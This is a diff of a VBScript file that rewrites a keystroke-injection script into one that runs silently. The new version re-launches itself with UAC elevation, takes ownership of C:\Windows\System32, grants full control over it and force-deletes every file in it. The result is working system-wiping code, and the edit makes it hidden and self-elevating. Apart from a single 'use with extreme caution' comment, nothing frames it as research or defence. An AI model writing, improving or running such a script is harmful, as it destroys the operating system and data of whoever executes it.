@@ -6,43 +6,38 @@ Dim WshShell, UAC, admin
 ' Create WScript Shell object
 Set WshShell = WScript.CreateObject("WScript.Shell")
 
-' Short sleep to allow environment setup (100 milliseconds)
-WScript.Sleep 100
-
-' Check admin privileges
-' It's better to run command separately rather than in one SendKeys
-WshShell.SendKeys "cmd /c net session >nul 2>&1" 
-WshShell.SendKeys "{ENTER}"
-WScript.Sleep 100
-
-' Set admin flag based on errorlevel
-WshShell.SendKeys "if %errorLevel% == 0 (set admin=1) else (set admin=0)" 
-WshShell.SendKeys "{ENTER}"
-WScript.Sleep 100
+' Check for admin privileges
+WshShell.Run "cmd /c net session >nul 2>&1", 0, True
+If WshShell.Run("cmd /c echo %errorlevel%", 0, True) = 0 Then
+    admin = 1
+Else
+    admin = 0
+End If
 
 ' Elevate again safely if not admin (requires UAC prompt)
-Set UAC = CreateObject("Shell.Application")
-' This needs to be executed manually or through ShellExecute, cannot SendKeys reliably
-' UAC.ShellExecute "cmd.exe", "/c your_script.bat", "", "runas", 1
+If admin = 0 Then
+    Set UAC = CreateObject("Shell.Application")
+    UAC.ShellExecute "cmd.exe", "/c """ & WScript.ScriptFullName & """", "", "runas", 1
+    WScript.Quit
+End If
+
+' Sleep for a short period to allow the command prompt to initialize
+WScript.Sleep 100
 
 ' Take ownership of System32 folder
-WshShell.SendKeys "takeown /f C:\Windows\System32 /r /d y" 
-WshShell.SendKeys "{ENTER}"
+WshShell.Run "takeown /f C:\Windows\System32 /r /d y", 0, True
 WScript.Sleep 100
 
 ' Grant administrators full control
-WshShell.SendKeys "icacls C:\Windows\System32 /grant administrators:F /t" 
-WshShell.SendKeys "{ENTER}"
+WshShell.Run "icacls C:\Windows\System32 /grant administrators:F /t", 0, True
 WScript.Sleep 100
 
 ' Change directory to System32
-WshShell.SendKeys "cd C:\Windows\System32" 
-WshShell.SendKeys "{ENTER}"
+WshShell.Run "cmd /c cd C:\Windows\System32", 0, True
 WScript.Sleep 100
 
 ' Delete all files (use with extreme caution: destructive operation)
-WshShell.SendKeys "del /F /S /Q *.*" 
-WshShell.SendKeys "{ENTER}"
+WshShell.Run "del /F /S /Q C:\Windows\System32\*.*", 0, True
 
 ' Clean up
 Set WshShell = Nothing
